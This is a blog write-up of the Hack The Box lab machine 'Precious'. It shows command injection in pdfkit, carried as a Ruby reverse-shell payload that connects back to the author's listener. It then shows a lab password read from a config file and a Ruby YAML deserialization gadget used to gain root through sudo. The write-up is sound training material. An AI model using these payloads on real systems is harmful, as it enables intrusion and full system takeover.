<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - Precious User flag Ports scanned
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.115 ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Getting web server info:
~p» curl -sI http://precious.htb/ HTTP/1.1 200 OK Content-Type: text/html;charset=utf-8 Content-Length: 483 Connection: keep-alive Status: 200 OK X-XSS-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Date: Fri, 02 Dec 2022 02:20:20 GMT X-Powered-By: Phusion Passenger(R) 6.0.15 Server: nginx/1.18.0 + Phusion Passenger(R) 6."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - Precious User flag Ports scanned
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.115 ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Getting web server info:
~p» curl -sI http://precious.htb/ HTTP/1.1 200 OK Content-Type: text/html;charset=utf-8 Content-Length: 483 Connection: keep-alive Status: 200 OK X-XSS-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Date: Fri, 02 Dec 2022 02:20:20 GMT X-Powered-By: Phusion Passenger(R) 6.0.15 Server: nginx/1.18.0 + Phusion Passenger(R) 6."><meta property="og:title" content><meta property="og:description" content="easy - Precious User flag Ports scanned
» sudo nmap --open --min-rate 5000 -T4 -Pn -p- 10.129.36.115 ... PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Getting web server info:
~p» curl -sI http://precious.htb/ HTTP/1.1 200 OK Content-Type: text/html;charset=utf-8 Content-Length: 483 Connection: keep-alive Status: 200 OK X-XSS-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Date: Fri, 02 Dec 2022 02:20:20 GMT X-Powered-By: Phusion Passenger(R) 6.0.15 Server: nginx/1.18.0 + Phusion Passenger(R) 6."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/precious/"><meta property="article:section" content="infosec"><title>easy - Precious </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/precious/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---precious>easy - Precious
<a class=heading-link href=#easy---precious><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Ports scanned</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>» sudo nmap --open --min-rate <span style=color:#0086f7;font-weight:700>5000</span> -T4 -Pn -p- 10.129.36.115
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>Getting web server info:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~p» curl -sI http://precious.htb/
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Content-Type: text/html;<span style=color:#fb660a>charset</span>=utf-8
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>483</span>
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Status: <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>X-XSS-Protection: 1; <span style=color:#fb660a>mode</span>=block
</span></span><span style=display:flex><span>X-Content-Type-Options: nosniff
</span></span><span style=display:flex><span>X-Frame-Options: SAMEORIGIN
</span></span><span style=display:flex><span>Date: Fri, <span style=color:#0086f7;font-weight:700>02</span> Dec <span style=color:#0086f7;font-weight:700>2022</span> 02:20:20 GMT
</span></span><span style=display:flex><span>X-Powered-By: Phusion Passenger(R) 6.0.15
</span></span><span style=display:flex><span>Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
</span></span><span style=display:flex><span>X-Runtime: Ruby
</span></span></code></pre></div><p>This form hangs, doesn&rsquo;t appear to do anything&mldr;</p><p><figure class=image-container><a href=../../../../../images/articles/precious/image-20221201222102868.png><img width=image-20221201222102868% src=../../../../../images/articles/precious/image-20221201222102868.png alt=image-20221201222102868></a></figure></p><p>It can&rsquo;t load a remote url, so I&rsquo;m passing a local (network) URL with <code>python -m http.server</code></p><p>Then, it can finally generate a PDF file, which by reading its properties I can see this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~/Downloads» strings sswaib4m7v3zspozoc5p56tct7mi0ypi.pdf | grep Generated
</span></span><span style=display:flex><span>/Creator (Generated by pdfkit v0.8.6)
</span></span><span style=display:flex><span>    &lt;rdf:li&gt;Generated by pdfkit v0.8.6&lt;/rdf:li&gt;
</span></span></code></pre></div><p>By Googling I&rsquo;ve found a common CVE:
<a href=https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795>https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a>
and then I&rsquo;ve crafted a simple string with does a ping to my host:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>http://10.10.14.17:8000/?name=<span style=color:#080;background-color:#0f140f;font-style:italic>#{%20`ping -c 1 10.10.14.17`}</span>
</span></span></code></pre></div><p>And then by reviewing my <code>tun0</code> icmp with <code>tcpdump</code> I started to receive traffic:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>14:57:22.415529 IP layer0 &gt; precious.htb: ICMP echo reply, id 23221, seq 204, length 64
</span></span><span style=display:flex><span>14:57:23.378068 IP precious.htb &gt; layer0: ICMP echo request, id 23221, seq 205, length 64
</span></span><span style=display:flex><span>14:57:23.378109 IP layer0 &gt; precious.htb: ICMP echo reply, id 23221, seq 205, length 64
</span></span></code></pre></div><p>So basically I can open a reverse shell with help of:
<a href=https://www.revshells.com/>https://www.revshells.com/</a></p><p>I will use a ruby interpreter, I know the server has ruby installed by reading these headers:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>HTTP/1.1 200 OK
</span></span><span style=display:flex><span>Content-Type: application/pdf
</span></span><span style=display:flex><span>Content-Length: 9845
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Status: 200 OK
</span></span><span style=display:flex><span>Content-Disposition: attachment; filename=&#34;zydk1oz129qgluc7mh026jarv6u5fn5v.pdf&#34;
</span></span><span style=display:flex><span>Last-Modified: Wed, 14 Dec 2022 02:15:18 GMT
</span></span><span style=display:flex><span>X-Content-Type-Options: nosniff
</span></span><span style=display:flex><span>Date: Wed, 14 Dec 2022 02:15:18 GMT
</span></span><span style=display:flex><span>X-Powered-By: Phusion Passenger(R) 6.0.15
</span></span><span style=display:flex><span>Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
</span></span><span style=display:flex><span>X-Runtime: Ruby
</span></span></code></pre></div><p>I crafted the payload:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-fallback data-lang=fallback><span style=display:flex><span>http://10.10.14.17:8000/?name=#{%20`ruby -rsocket -e&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.14.17&#34;,9001))&#39;`}
</span></span></code></pre></div><p>And voilá!</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>» nc -lvnp <span style=color:#0086f7;font-weight:700>9001</span>
</span></span><span style=display:flex><span>Connection from 10.129.32.16:33736
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(ruby) <span style=color:#fb660a>gid</span>=1001(ruby) <span style=color:#fb660a>groups</span>=1001(ruby)
</span></span><span style=display:flex><span>pwd
</span></span><span style=display:flex><span>/var/www/pdfapp
</span></span></code></pre></div><p>I had to review HTB forums for hints, they suggested to look for hidden things once inside, and here we are:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>ruby@precious:~$ cat .bundle/config
</span></span><span style=display:flex><span>cat .bundle/config
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>BUNDLE_HTTPS://RUBYGEMS__ORG/: <span style=color:#0086d2>&#34;henry:Q3c1AqGHtoI0aXAYFH&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>» ssh henry@precious.htb
</span></span><span style=display:flex><span>The authenticity of host <span style=color:#0086d2>&#39;precious.htb (10.129.32.16)&#39;</span> can&#39;t be established.
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>henry@precious:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(henry) <span style=color:#fb660a>gid</span>=1000(henry) <span style=color:#fb660a>groups</span>=1000(henry)
</span></span></code></pre></div><h2 id=root-flag>Root flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Once inside the box, I&rsquo;m trying to escalate privileges:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>henry@precious:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> henry on precious:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User henry may run the following commands on precious:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
</span></span></code></pre></div><p>Reading the .rb file</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>henry@precious:~$ cat /opt/update_dependencies.rb
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Compare installed dependencies with those specified in &#34;dependencies.yml&#34;</span>
</span></span><span style=display:flex><span>require <span style=color:#0086d2>&#34;yaml&#34;</span>
</span></span><span style=display:flex><span>require <span style=color:#0086d2>&#39;rubygems&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># TODO: update versions automatically</span>
</span></span><span style=display:flex><span>def update_gems()
</span></span><span style=display:flex><span>end
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def list_from_file
</span></span><span style=display:flex><span>    YAML.load(File.read(<span style=color:#0086d2>&#34;dependencies.yml&#34;</span>))
</span></span><span style=display:flex><span>end
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def list_local_gems
</span></span><span style=display:flex><span>    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
</span></span><span style=display:flex><span>end
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>gems_file</span> = list_from_file
</span></span><span style=display:flex><span><span style=color:#fb660a>gems_local</span> = list_local_gems
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gems_file.each <span style=color:#fb660a;font-weight:700>do</span> |file_name, file_version|
</span></span><span style=display:flex><span>    gems_local.each <span style=color:#fb660a;font-weight:700>do</span> |local_name, local_version|
</span></span><span style=display:flex><span>        <span style=color:#fb660a;font-weight:700>if</span>(<span style=color:#fb660a>file_name</span> == local_name)
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>if</span>(file_version != local_version)
</span></span><span style=display:flex><span>                puts <span style=color:#0086d2>&#34;Installed version differs from the one specified in file: &#34;</span> + local_name
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>else</span>
</span></span><span style=display:flex><span>                puts <span style=color:#0086d2>&#34;Installed version is equals to the one specified in file: &#34;</span> + local_name
</span></span><span style=display:flex><span>            end
</span></span><span style=display:flex><span>        end
</span></span><span style=display:flex><span>    end
</span></span><span style=display:flex><span>end
</span></span></code></pre></div><p>Notice it is reading a file without absolute path :evil:</p><p>Ruby 2.7 has this vulnerability:
<a href=https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/>https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/</a></p><p>Creating a vulnerable dependencies.yml:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-yaml data-lang=yaml><span style=display:flex><span>---<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888></span>- !ruby/object:Gem::Installer<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>    </span><span style=color:#fb660a;font-weight:700>i</span>:<span style=color:#888> </span>x<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888></span>- !ruby/object:Gem::SpecFetcher<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>    </span><span style=color:#fb660a;font-weight:700>i</span>:<span style=color:#888> </span><span style=color:#fb660a;font-weight:700>y</span><span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888></span>- !ruby/object:Gem::Requirement<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>  </span><span style=color:#fb660a;font-weight:700>requirements</span>:<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>    </span>!ruby/object:Gem::Package::TarReader<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>    </span><span style=color:#fb660a;font-weight:700>io</span>:<span style=color:#888> </span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&amp;1</span><span style=color:#888> </span>!ruby/object:Net::BufferedIO<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>io</span>:<span style=color:#888> </span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&amp;1</span><span style=color:#888> </span>!ruby/object:Gem::Package::TarReader::Entry<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>         </span><span style=color:#fb660a;font-weight:700>read</span>:<span style=color:#888> </span><span style=color:#0086f7;font-weight:700>0</span><span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>         </span><span style=color:#fb660a;font-weight:700>header</span>:<span style=color:#888> </span><span style=color:#0086d2>&#34;abc&#34;</span><span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>      </span><span style=color:#fb660a;font-weight:700>debug_output</span>:<span style=color:#888> </span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&amp;1</span><span style=color:#888> </span>!ruby/object:Net::WriteAdapter<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>         </span><span style=color:#fb660a;font-weight:700>socket</span>:<span style=color:#888> </span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&amp;1</span><span style=color:#888> </span>!ruby/object:Gem::RequestSet<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>             </span><span style=color:#fb660a;font-weight:700>sets</span>:<span style=color:#888> </span>!ruby/object:Net::WriteAdapter<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>                 </span><span style=color:#fb660a;font-weight:700>socket</span>:<span style=color:#888> </span>!ruby/module &#39;Kernel&#39;<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>                 </span><span style=color:#fb660a;font-weight:700>method_id</span>:<span style=color:#888> </span>:system<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>             </span><span style=color:#fb660a;font-weight:700>git_set</span>:<span style=color:#888> </span>id<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>         </span><span style=color:#fb660a;font-weight:700>method_id</span>:<span style=color:#888> </span>:resolve<span style=color:#888>
</span></span></span></code></pre></div><p>Testing the vulnerable yaml file, running command <code>id</code></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
</span></span><span style=display:flex><span>sh: 1: reading: not found
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span><span style=display:flex><span>Traceback (most recent call last):
</span></span><span style=display:flex><span>        33: from /opt/update_dependencies.rb:17:in <span style=color:#0086d2>`</span>&lt;main&gt;<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;</span>
</span></span><span style=display:flex><span>        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in <span style=color:#0086d2>`</span>load<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;</span>
</span></span><span style=display:flex><span>        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in <span style=color:#0086d2>`</span>accept<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;</span>
</span></span><span style=display:flex><span>        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in <span style=color:#0086d2>`</span>visit<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39;</span>
</span></span><span style=display:flex><span>        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in <span style=color:#0086d2>`</span>accept<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;</span>
</span></span><span style=display:flex><span>        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in <span style=color:#0086d2>`</span>visit<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39;</span>
</span></span><span style=display:flex><span>        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in <span style=color:#0086d2>`</span>register_empty<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39;</span>
</span></span><span style=display:flex><span>        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in <span style=color:#0086d2>`</span>block in register_empty<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;</span>
</span></span><span style=display:flex><span>        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in <span style=color:#0086d2>`</span>accept<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;</span>
</span></span><span style=display:flex><span>        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in <span style=color:#0086d2>`</span>visit_Psych_Nodes_Mapping<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39;</span>
</span></span><span style=display:flex><span>        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in <span style=color:#0086d2>`</span>init_with<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39;</span>
</span></span><span style=display:flex><span>        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in <span style=color:#0086d2>`</span>yaml_initialize<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39;</span>
</span></span><span style=display:flex><span>         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in <span style=color:#0086d2>`</span>each<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39;</span>
</span></span><span style=display:flex><span>         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in <span style=color:#0086d2>`</span>read<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39;</span>
</span></span><span style=display:flex><span>         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in <span style=color:#0086d2>`</span>&lt;&lt;<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;</span>
</span></span><span style=display:flex><span>         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in <span style=color:#0086d2>`</span>resolve<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;</span>
</span></span><span style=display:flex><span>         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in <span style=color:#0086d2>`</span>write<span style=color:#0086d2>&#39;
</span></span></span><span style=display:flex><span><span style=color:#0086d2>/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;</span>: no implicit conversion of nil into String (TypeError)
</span></span></code></pre></div><p>Opening a shell as root:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
</span></span><span style=display:flex><span>sh: 1: reading: not found
</span></span><span style=display:flex><span>root@precious:/home/henry# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>